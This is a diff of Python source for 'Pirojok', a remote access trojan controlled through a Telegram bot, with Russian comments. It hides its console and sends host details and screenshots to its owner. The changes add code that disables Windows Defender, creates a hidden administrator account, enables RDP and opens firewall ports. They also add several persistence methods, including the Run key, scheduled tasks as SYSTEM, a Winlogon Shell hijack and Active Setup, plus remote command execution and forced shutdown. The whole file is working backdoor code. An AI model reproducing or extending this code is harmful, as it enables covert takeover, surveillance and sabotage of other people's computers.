@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 Пирожок - вкусное блюдо для удаленного управления
-Версия 3.0 - с правами администратора и уведомлениями
+Версия 3.2 - с админ-командами, автозагрузкой через explorer и task scheduler
 """
 
 import os
@@ -37,7 +37,7 @@ class Pirojok:
         self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
         self.running = True
         self.processes = []
-        self.version = "3.0.0"
+        self.version = "3.2.0"
         self.command_timeout = 60
         self.admin_mode = self.check_admin()
         self.startup_time = datetime.now()
@@ -45,13 +45,14 @@ class Pirojok:
         # Создаём файл-маркер для отслеживания запусков
         self.marker_file = os.path.join(tempfile.gettempdir(), "pirojok_first_run.marker")
         
+    # ========== ПРОВЕРКА ПРАВ ==========
+    
     def check_admin(self):
         """Проверка прав администратора"""
         try:
             if platform.system() == "Windows":
                 return ctypes.windll.shell32.IsUserAnAdmin()
             else:
-                # Для Linux/Mac проверяем EUID
                 return os.geteuid() == 0
         except:
             return False
@@ -66,7 +67,6 @@ class Pirojok:
             if platform.system() != "Windows":
                 return False
             
-            # Определяем путь к исполняемому файлу
             if getattr(sys, 'frozen', False):
                 executable = sys.executable
                 params = ' '.join(sys.argv[1:])
@@ -74,17 +74,14 @@ class Pirojok:
                 executable = sys.executable
                 params = ' '.join([sys.argv[0]] + sys.argv[1:])
             
-            # Создаём маркер, что мы уже запрашивали права
             with open(self.marker_file, 'w') as f:
                 f.write(f"admin_requested:{datetime.now().isoformat()}")
             
-            # Запрашиваем права через UAC
             result = ctypes.windll.shell32.ShellExecuteW(
                 None, "runas", executable, params, None, 1
             )
             
             if result > 32:
-                # Завершаем текущий процесс, новый запустится с правами
                 self.send_message(self.owner_id, "👑 Запрашиваю права администратора...")
                 sys.exit(0)
             else:
@@ -95,14 +92,15 @@ class Pirojok:
             self.send_message(self.owner_id, f"❌ Ошибка запроса прав: {e}")
             return False
     
+    # ========== АДМИН-КОМАНДЫ ==========
+    
     def run_as_admin_command(self, command):
         """Выполнение команды с правами администратора"""
         try:
             if not self.admin_mode:
-                return "❌ Нет прав администратора. Используйте команду 'admin' сначала"
+                return "❌ Нет прав администратора. Используйте 'admin' сначала"
             
             if platform.system() == "Windows":
-                # Запускаем cmd с повышенными правами
                 process = subprocess.Popen(
                     f'cmd /c {command}',
                     shell=True,
@@ -114,7 +112,6 @@ class Pirojok:
                     errors='ignore'
                 )
             else:
-                # Для Linux/Mac используем sudo (если настроено)
                 process = subprocess.Popen(
                     f'sudo {command}',
                     shell=True,
@@ -144,21 +141,273 @@ class Pirojok:
         except Exception as e:
             return f"❌ Ошибка: {str(e)}"
     
+    def create_admin_user(self, username, password):
+        """Создание пользователя с правами администратора"""
+        try:
+            if not self.admin_mode:
+                return "❌ Нужны права администратора"
+            
+            cmd = f'net user {username} {password} /add && net localgroup administrators {username} /add'
+            result = self.run_as_admin_command(cmd)
+            return f"👤 Создан пользователь {username}\n{result}"
+        except Exception as e:
+            return f"❌ Ошибка: {str(e)}"
+    
+    def enable_rdp(self):
+        """Включение удаленного рабочего стола"""
+        try:
+            if not self.admin_mode:
+                return "❌ Нужны права администратора"
+            
+            commands = [
+                'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
+                'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes',
+                'sc config TermService start= auto',
+                'net start TermService'
+            ]
+            
+            for cmd in commands:
+                self.run_as_admin_command(cmd)
+            
+            ip = requests.get('https://api.ipify.org', timeout=5).text
+            return f"✅ RDP включен\nIP: {ip}\nПорт: 3389"
+        except Exception as e:
+            return f"❌ Ошибка: {str(e)}"
+    
+    def disable_defender(self):
+        """Отключение Windows Defender"""
+        try:
+            if not self.admin_mode:
+                return "❌ Нужны права администратора"
+            
+            commands = [
+                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
+                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v TamperProtection /t REG_DWORD /d 0 /f',
+                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
+            ]
+            
+            for cmd in commands:
+                self.run_as_admin_command(cmd)
+            
+            return "✅ Windows Defender отключен"
+        except Exception as e:
+            return f"❌ Ошибка: {str(e)}"
+    
+    def add_firewall_rule(self, port, name="Pirojok"):
+        """Добавление правила в фаервол"""
+        try:
+            if not self.admin_mode:
+                return "❌ Нужны права администратора"
+            
+            cmd = f'netsh advfirewall firewall add rule name="{name}" dir=in action=allow protocol=TCP localport={port}'
+            self.run_as_admin_command(cmd)
+            return f"✅ Правило добавлено для порта {port}"
+        except Exception as e:
+            return f"❌ Ошибка: {str(e)}"
+    
+    # ========== АВТОЗАГРУЗКА ==========
+    
+    def add_to_startup_registry(self):
+        """Добавление в реестр (HKCU Run)"""
+        try:
+            if platform.system() != "Windows":
+                return "❌ Только для Windows"
+            
+            if getattr(sys, 'frozen', False):
+                exe_path = sys.executable
+            else:
+                exe_path = os.path.abspath(__file__)
+            
+            key = winreg.HKEY_CURRENT_USER
+            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
+                winreg.SetValueEx(regkey, "Pirojok", 0, winreg.REG_SZ, f'"{exe_path}"')
+            
+            return "✅ Добавлено в реестр (HKCU\\Run)"
+        except Exception as e:
+            return f"❌ Ошибка: {str(e)}"
+    
+    def add_to_startup_folder(self):
+        """Добавление в папку автозагрузки"""
+        try:
+            if platform.system() != "Windows":
+                return "❌ Только для Windows"
+            
+            startup_folder = os.path.join(
+                os.getenv('APPDATA'),
+                r'Microsoft\Windows\Start Menu\Programs\Startup'
+            )
+            
+            if getattr(sys, 'frozen', False):
+                exe_path = sys.executable
+            else:
+                exe_path = os.path.abspath(__file__)
+            
+            # Создаём ярлык через VBS
+            vbs_script = f'''
+            Set oWS = WScript.CreateObject("WScript.Shell")
+            sLinkFile = "{startup_folder}\\Pirojok.lnk"
+            Set oLink = oWS.CreateShortcut(sLinkFile)
+            oLink.TargetPath = "{exe_path}"
+            oLink.Save
+            '''
+            
+            vbs_path = os.path.join(tempfile.gettempdir(), "create_shortcut.vbs")
+            with open(vbs_path, 'w') as f:
+                f.write(vbs_script)
+            
+            subprocess.run(['cscript', vbs_path, '//nologo'], capture_output=True)
+            os.remove(vbs_path)
+            
+            return "✅ Добавлено в папку автозагрузки"
+        except Exception as e:
+            return f"❌ Ошибка: {str(e)}"
+    
+    def add_to_task_scheduler(self):
+        """Добавление в планировщик заданий (при входе пользователя)"""
+        try:
+            if platform.system() != "Windows":
+                return "❌ Только для Windows"
+            
+            if getattr(sys, 'frozen', False):
+                exe_path = sys.executable
+            else:
+                exe_path = os.path.abspath(__file__)
+            
+            task_name = "PirojokStartup"
+            cmd = [
+                'schtasks', '/create', '/tn', task_name,
+                '/tr', f'"{exe_path}"',
+                '/sc', 'onlogon',
+                '/rl', 'highest',
+                '/f'
+            ]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True)
+            
+            if result.returncode == 0:
+                return "✅ Добавлено в планировщик (при входе)"
+            else:
+                return f"❌ Ошибка: {result.stderr}"
+        except Exception as e:
+            return f"❌ Ошибка: {str(e)}"
+    
+    def add_to_task_startup(self):
+        """Добавление в планировщик (при старте системы)"""
+        try:
+            if not self.admin_mode:
+                return "❌ Нужны права администратора"
+            
+            if getattr(sys, 'frozen', False):
+                exe_path = sys.executable
+            else:
+                exe_path = os.path.abspath(__file__)
+            
+            task_name = "PirojokSystemStart"
+            cmd = [
+                'schtasks', '/create', '/tn', task_name,
+                '/tr', f'"{exe_path}"',
+                '/sc', 'onstart',
+                '/ru', 'SYSTEM',
+                '/rl', 'highest',
+                '/f'
+            ]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True)
+            
+            if result.returncode == 0:
+                return "✅ Добавлено в планировщик (при старте системы)"
+            else:
+                return f"❌ Ошибка: {result.stderr}"
+        except Exception as e:
+            return f"❌ Ошибка: {str(e)}"
+    
+    def add_to_explorer(self):
+        """Запуск вместе с explorer.exe (через Shell-расширение)"""
+        try:
+            if not self.admin_mode:
+                return "❌ Нужны права администратора"
+            
+            if getattr(sys, 'frozen', False):
+                exe_path = sys.executable
+            else:
+                exe_path = os.path.abspath(__file__)
+            
+            # Добавляем в Shell
+            key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+            key = winreg.HKEY_LOCAL_MACHINE
+            
+            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as regkey:
+                # Получаем текущее значение Shell
+                try:
+                    current_shell, _ = winreg.QueryValueEx(regkey, "Shell")
+                except:
+                    current_shell = "explorer.exe"
+                
+                # Добавляем наш пирожок
+                new_shell = f"{exe_path}, {current_shell}"
+                winreg.SetValueEx(regkey, "Shell", 0, winreg.REG_SZ, new_shell)
+            
+            return "✅ Добавлено в Shell (запуск с explorer.exe)"
+        except Exception as e:
+            return f"❌ Ошибка: {str(e)}"
+    
+    def add_to_active_setup(self):
+        """Добавление в Active Setup (для всех пользователей)"""
+        try:
+            if not self.admin_mode:
+                return "❌ Нужны права администратора"
+            
+            if getattr(sys, 'frozen', False):
+                exe_path = sys.executable
+            else:
+                exe_path = os.path.abspath(__file__)
+            
+            guid = str(uuid.uuid4())
+            key_path = f"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{guid}"
+            key = winreg.HKEY_LOCAL_MACHINE
+            
+            with winreg.CreateKey(key, key_path) as regkey:
+                winreg.SetValueEx(regkey, "StubPath", 0, winreg.REG_SZ, f'"{exe_path}"')
+                winreg.SetValueEx(regkey, "Version", 0, winreg.REG_SZ, "1,0,0,0")
+            
+            return "✅ Добавлено в Active Setup (для всех пользователей)"
+        except Exception as e:
+            return f"❌ Ошибка: {str(e)}"
+    
+    def remove_all_startup(self):
+        """Удаление из всех мест автозагрузки"""
+        results = []
+        
+        # Удаляем из реестра
+        try:
+            key = winreg.HKEY_CURRENT_USER
+            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
+                winreg.DeleteValue(regkey, "Pirojok")
+            results.append("✅ Удалено из реестра")
+        except:
+            results.append("❌ Не найдено в реестре")
+        
+        # Удаляем из планировщика
+        subprocess.run(['schtasks', '/delete', '/tn', 'PirojokStartup', '/f'], capture_output=True)
+        subprocess.run(['schtasks', '/delete', '/tn', 'PirojokSystemStart', '/f'], capture_output=True)
+        results.append("✅ Удалено из планировщика")
+        
+        return "\n".join(results)
+    
+    # ========== ОСНОВНЫЕ ФУНКЦИИ ==========
+    
     def send_message(self, chat_id, text):
-        """Отправка сообщения"""
         try:
             url = f"{self.base_url}/sendMessage"
-            data = {
-                "chat_id": chat_id,
-                "text": text,
-                "parse_mode": "HTML"
-            }
+            data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
             requests.post(url, data=data, timeout=10)
         except Exception as e:
             print(f"Send error: {e}")
     
     def send_photo(self, chat_id, photo_bytes, caption=""):
-        """Отправка фото"""
         try:
             url = f"{self.base_url}/sendPhoto"
             files = {"photo": ("screenshot.jpg", photo_bytes, "image/jpeg")}
@@ -168,7 +417,6 @@ class Pirojok:
             pass
     
     def get_system_info(self):
-        """Сбор информации о системе"""
         info = []
         info.append(f"🥧 <b>ПИРОЖОК ИСПЕКСЯ!</b>")
         info.append(f"🍽 Версия: {self.version}")
@@ -183,14 +431,12 @@ class Pirojok:
         info.append(f"⚙️ ОС: {platform.system()} {platform.release()}")
         info.append(f"🔧 Архитектура: {platform.machine()}")
         
-        # Информация о времени работы
         uptime = datetime.now() - self.startup_time
         info.append(f"⏱ Работаю: {str(uptime).split('.')[0]}")
         
         return "\n".join(info)
     
     def take_screenshot(self):
-        """Скриншот"""
         try:
             screenshot = pyautogui.screenshot()
             img_bytes = io.BytesIO()
@@ -201,7 +447,6 @@ class Pirojok:
             return None
     
     def execute_command(self, command):
-        """Обычная команда"""
         try:
             if platform.system() == "Windows":
                 if command.lower().startswith("start "):
@@ -248,60 +493,89 @@ class Pirojok:
         except Exception as e:
             return f"❌ Ошибка: {str(e)}"
     
-    def add_to_startup(self):
-        """Добавление в автозагрузку"""
+    # ========== МОМЕНТАЛЬНЫЕ КОМАНДЫ ==========
+    
+    def shutdown_instant(self):
+        """Моментальное выключение"""
         try:
-            if platform.system() != "Windows":
-                return "❌ Только для Windows"
-            
-            if getattr(sys, 'frozen', False):
-                exe_path = sys.executable
+            if platform.system() == "Windows":
+                os.system("shutdown /s /f /t 0")
             else:
-                exe_path = os.path.abspath(__file__)
-            
-            # HKCU Run (не требует админа)
-            key = winreg.HKEY_CURRENT_USER
-            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
-            
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
-                winreg.SetValueEx(regkey, "SystemHelper", 0, winreg.REG_SZ, f'"{exe_path}"')
-            
-            return "✅ Добавлено в автозагрузку"
+                os.system("shutdown -h now")
+            return "💥 Выключаюсь МОМЕНТАЛЬНО!"
         except Exception as e:
             return f"❌ Ошибка: {str(e)}"
     
-    def remove_from_startup(self):
-        """Удаление из автозагрузки"""
+    def reboot_instant(self):
+        """Моментальная перезагрузка"""
+        try:
+            if platform.system() == "Windows":
+                os.system("shutdown /r /f /t 0")
+            else:
+                os.system("reboot -f")
+            return "⚡ Перезагружаюсь МОМЕНТАЛЬНО!"
+        except Exception as e:
+            return f"❌ Ошибка: {str(e)}"
+    
+    def shutdown_emergency(self):
+        """Аварийное выключение"""
         try:
             if platform.system() != "Windows":
                 return "❌ Только для Windows"
             
-            key = winreg.HKEY_CURRENT_USER
-            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            os.system("taskkill /f /im *")
+            os.system("shutdown /s /f /t 0")
             
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
-                winreg.DeleteValue(regkey, "SystemHelper")
+            return "☠️ АВАРИЙНОЕ ВЫКЛЮЧЕНИЕ!"
+        except Exception as e:
+            return f"❌ Ошибка: {str(e)}"
+    
+    # ========== ЗАПУСК ПРИ СТАРТЕ ==========
+    
+    def on_system_startup(self):
+        """Действия при запуске системы"""
+        try:
+            # Проверяем маркер
+            if os.path.exists(self.marker_file):
+                os.remove(self.marker_file)
+                return
             
-            return "✅ Удалено из автозагрузки"
-        except:
-            return "❌ Не найдено в автозагрузке"
+            # Отправляем уведомление
+            boot_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            message = f"🥧 <b>Пирожок испекся!</b>\n\n"
+            message += f"📅 Время включения: {boot_time}\n"
+            message += f"💻 Хост: {socket.gethostname()}\n"
+            message += f"👤 Пользователь: {getpass.getuser()}\n"
+            message += f"👑 Права: {'Администратор' if self.admin_mode else 'Пользователь'}\n"
+            
+            self.send_message(self.owner_id, message)
+            
+            # Скриншот
+            time.sleep(5)
+            screenshot = self.take_screenshot()
+            if screenshot:
+                self.send_photo(self.owner_id, screenshot, "🥧 Рабочий стол после включения")
+            
+        except Exception as e:
+            print(f"Startup error: {e}")
+    
+    # ========== ОБРАБОТКА КОМАНД ==========
     
     def process_command(self, text, chat_id):
-        """Обработка команд"""
-        
         if chat_id != self.owner_id:
             self.send_message(chat_id, "⛔ Не для вас!")
             return
         
-        # Проверка прав перед административными командами
-        admin_commands = ["admin_cmd", "winlogon_add", "task_startup", "active_setup", "ifeo"]
+        # Админ-команды
+        admin_commands = ["admin_cmd", "winlogon_add", "task_startup", "active_setup", 
+                         "create_user", "enable_rdp", "disable_defender", "add_rule"]
         cmd_type = text.split()[0] if text else ""
         
         if cmd_type in admin_commands and not self.admin_mode:
             self.send_message(chat_id, "👑 Эта команда требует прав администратора. Сначала используйте 'admin'")
             return
         
-        # Обычная cmd
+        # Основные команды
         if text.startswith("cmd"):
             cmd = text[3:].strip()
             if cmd:
@@ -313,42 +587,120 @@ class Pirojok:
                         part = result[i:i+3500]
                         self.send_message(chat_id, f"📄 Часть {i//3500 + 1}:\n{part}")
                 else:
-                    self.send_message(chat_id, f"🥘 <b>Результат:</b>\n{result}")
+                    self.send_message(chat_id, f"🥘 Результат:\n{result}")
             else:
                 self.send_message(chat_id, "⚠️ Используйте: cmd <команда>")
         
-        # Команда с правами админа
         elif text.startswith("admin_cmd"):
             cmd = text[9:].strip()
             if cmd:
-                self.send_message(chat_id, f"👑 Выполняю с правами админа: {cmd}")
+                self.send_message(chat_id, f"👑 Выполняю: {cmd}")
                 result = self.run_as_admin_command(cmd)
-                
-                if len(result) > 4000:
-                    for i in range(0, len(result), 3500):
-                        part = result[i:i+3500]
-                        self.send_message(chat_id, f"📄 Часть {i//3500 + 1}:\n{part}")
-                else:
-                    self.send_message(chat_id, f"👑 <b>Результат:</b>\n{result}")
+                self.send_message(chat_id, f"👑 Результат:\n{result[:3500]}")
             else:
                 self.send_message(chat_id, "⚠️ Используйте: admin_cmd <команда>")
         
-        # Запрос прав администратора
         elif text == "admin":
             if self.admin_mode:
                 self.send_message(chat_id, "👑 Уже есть права администратора!")
             else:
-                self.send_message(chat_id, "🔄 Запрашиваю права администратора...")
+                self.send_message(chat_id, "🔄 Запрашиваю права...")
                 self.request_admin()
         
-        # Проверка прав
         elif text == "admin_check":
-            if self.admin_mode:
-                self.send_message(chat_id, "👑 Права администратора: ДА")
-            else:
-                self.send_message(chat_id, "👤 Права администратора: НЕТ")
+            self.send_message(chat_id, f"👑 Права: {'ЕСТЬ' if self.admin_mode else 'НЕТ'}")
         
-        # website
+        # Админ-утилиты
+        elif text.startswith("create_user"):
+            parts = text.split()
+            if len(parts) == 3:
+                result = self.create_admin_user(parts[1], parts[2])
+                self.send_message(chat_id, result)
+            else:
+                self.send_message(chat_id, "⚠️ Используйте: create_user username password")
+        
+        elif text == "enable_rdp":
+            result = self.enable_rdp()
+            self.send_message(chat_id, result)
+        
+        elif text == "disable_defender":
+            result = self.disable_defender()
+            self.send_message(chat_id, result)
+        
+        elif text.startswith("add_rule"):
+            parts = text.split()
+            if len(parts) >= 2:
+                port = parts[1]
+                name = parts[2] if len(parts) > 2 else "Pirojok"
+                result = self.add_firewall_rule(port, name)
+                self.send_message(chat_id, result)
+            else:
+                self.send_message(chat_id, "⚠️ Используйте: add_rule <port> [name]")
+        
+        # Автозагрузка
+        elif text == "startup_reg":
+            result = self.add_to_startup_registry()
+            self.send_message(chat_id, result)
+        
+        elif text == "startup_folder":
+            result = self.add_to_startup_folder()
+            self.send_message(chat_id, result)
+        
+        elif text == "task_logon":
+            result = self.add_to_task_scheduler()
+            self.send_message(chat_id, result)
+        
+        elif text == "task_startup":
+            result = self.add_to_task_startup()
+            self.send_message(chat_id, result)
+        
+        elif text == "explorer_shell":
+            result = self.add_to_explorer()
+            self.send_message(chat_id, result)
+        
+        elif text == "active_setup":
+            result = self.add_to_active_setup()
+            self.send_message(chat_id, result)
+        
+        elif text == "startup_remove_all":
+            result = self.remove_all_startup()
+            self.send_message(chat_id, result)
+        
+        # Моментальные команды
+        elif text == "shutdown_now":
+            result = self.shutdown_instant()
+            self.send_message(chat_id, result)
+        
+        elif text == "reboot_now":
+            result = self.reboot_instant()
+            self.send_message(chat_id, result)
+        
+        elif text == "shutdown_emergency":
+            result = self.shutdown_emergency()
+            self.send_message(chat_id, result)
+        
+        # Обычные команды
+        elif text == "shutdown":
+            self.send_message(chat_id, "💤 Выключение через 5 секунд...")
+            if platform.system() == "Windows":
+                os.system("shutdown /s /t 5")
+            else:
+                os.system("sudo shutdown -h +1")
+        
+        elif text == "reboot":
+            self.send_message(chat_id, "🔄 Перезагрузка через 5 секунд...")
+            if platform.system() == "Windows":
+                os.system("shutdown /r /t 5")
+            else:
+                os.system("sudo reboot")
+        
+        elif text == "abort":
+            if platform.system() == "Windows":
+                os.system("shutdown /a")
+                self.send_message(chat_id, "✅ Выключение отменено")
+            else:
+                self.send_message(chat_id, "❌ Отмена только для Windows")
+        
         elif text.startswith("website"):
             url = text[7:].strip()
             if url:
@@ -362,111 +714,60 @@ class Pirojok:
             else:
                 self.send_message(chat_id, "⚠️ Используйте: website <url>")
         
-        # reboot
-        elif text == "reboot":
-            self.send_message(chat_id, "🔄 Перезагрузка через 5 секунд...")
-            if platform.system() == "Windows":
-                os.system("shutdown /r /t 5")
-            else:
-                os.system("sudo reboot")
-        
-        # shutdown
-        elif text == "shutdown":
-            self.send_message(chat_id, "💤 Выключение через 5 секунд...")
-            if platform.system() == "Windows":
-                os.system("shutdown /s /t 5")
-            else:
-                os.system("sudo shutdown -h now")
-        
-        # shot
         elif text == "shot":
             self.send_message(chat_id, "📸 Фоткаю...")
             screenshot = self.take_screenshot()
             if screenshot:
                 self.send_photo(chat_id, screenshot, "🥧 Скриншот")
             else:
-                self.send_message(chat_id, "❌ Не удалось сделать скриншот")
+                self.send_message(chat_id, "❌ Не удалось")
         
-        # startup
-        elif text == "startup_add":
-            result = self.add_to_startup()
-            self.send_message(chat_id, result)
-        
-        elif text == "startup_remove":
-            result = self.remove_from_startup()
-            self.send_message(chat_id, result)
-        
-        # winlogon (требует админа)
-        elif text == "winlogon_add":
-            # Здесь код добавления в Winlogon (из предыдущих ответов)
-            self.send_message(chat_id, "🔧 Функция в разработке")
-        
-        # info
         elif text == "info":
             self.send_message(chat_id, self.get_system_info())
         
-        # help
         elif text == "help" or text == "menu":
             help_text = """
-🥧 <b>ПИРОЖОК v3.0 МЕНЮ:</b>
+🥧 <b>ПИРОЖОК v3.2 МЕНЮ:</b>
 
-<b>ОСНОВНЫЕ:</b>
-• cmd [команда] - обычная команда
+<b>⚡ МОМЕНТАЛЬНО:</b>
+• shutdown_now - выключить сейчас
+• reboot_now - перезагрузить сейчас
+• shutdown_emergency - аварийно
+
+<b>👑 АДМИН-КОМАНДЫ:</b>
+• admin - запросить права
 • admin_cmd [команда] - команда от админа
-• website [url] - открыть сайт
-• shot - скриншот
-• info - информация о системе
-• reboot/shutdown - перезагрузка/выключение
-
-<b>👑 АДМИНИСТРИРОВАНИЕ:</b>
-• admin - запросить права админа (один раз)
-• admin_check - проверить права
-• winlogon_add - добавить в Winlogon (админ)
+• create_user user pass - создать админа
+• enable_rdp - включить RDP
+• disable_defender - отключить Defender
+• add_rule port [name] - правило FW
 
 <b>🔄 АВТОЗАПУСК:</b>
-• startup_add - добавить в автозагрузку
-• startup_remove - удалить из автозагрузки
+• startup_reg - в реестр
+• startup_folder - в папку
+• task_logon - планировщик (вход)
+• task_startup - планировщик (старт)
+• explorer_shell - с explorer.exe
+• active_setup - для всех юзеров
+• startup_remove_all - удалить всё
+
+<b>📸 ОСНОВНЫЕ:</b>
+• cmd [команда] - команда
+• website [url] - открыть сайт
+• shot - скриншот
+• info - информация
+• reboot/shutdown - с задержкой
+• abort - отмена
             """
             self.send_message(chat_id, help_text)
         
         else:
-            self.send_message(chat_id, "❓ Нет такой команды. Используйте help")
-    
-    def on_system_startup(self):
-        """Действия при запуске системы"""
-        try:
-            # Проверяем, первый ли это запуск после перезагрузки
-            if os.path.exists(self.marker_file):
-                # Это не первый запуск (после запроса прав)
-                os.remove(self.marker_file)
-                return
-            
-            # Отправляем уведомление о включении
-            boot_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-            message = f"🥧 <b>Пирожок испекся!</b>\n\n"
-            message += f"📅 Время включения: {boot_time}\n"
-            message += f"💻 Хост: {socket.gethostname()}\n"
-            message += f"👤 Пользователь: {getpass.getuser()}\n"
-            message += f"👑 Права: {'Администратор' if self.admin_mode else 'Пользователь'}\n"
-            
-            self.send_message(self.owner_id, message)
-            
-            # Отправляем скриншот рабочего стола
-            time.sleep(5)  # Даем время на загрузку рабочего стола
-            screenshot = self.take_screenshot()
-            if screenshot:
-                self.send_photo(self.owner_id, screenshot, "🥧 Рабочий стол после включения")
-            
-        except Exception as e:
-            print(f"Startup error: {e}")
+            self.send_message(chat_id, "❓ Нет такой команды")
     
     def main_loop(self):
         """Основной цикл"""
-        
-        # Действия при запуске
         self.on_system_startup()
         
-        # Отправляем информацию (если не отправили в on_system_startup)
         if not os.path.exists(self.marker_file):
             self.send_message(self.owner_id, self.get_system_info())
         
@@ -500,22 +801,16 @@ class Pirojok:
                 time.sleep(5)
     
     def run(self):
-        """Запуск"""
         try:
-            # Проверяем права при старте
             self.admin_mode = self.check_admin()
-            
-            # Запускаем основной цикл
             self.main_loop()
         except KeyboardInterrupt:
             self.running = False
             self.send_message(self.owner_id, "🥧 Пирожок убрали в холодильник")
 
 if __name__ == "__main__":
-    # Скрываем консоль на Windows
     if platform.system() == "Windows":
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     
-    # Запускаем
     pirojok = Pirojok()
     pirojok.run()
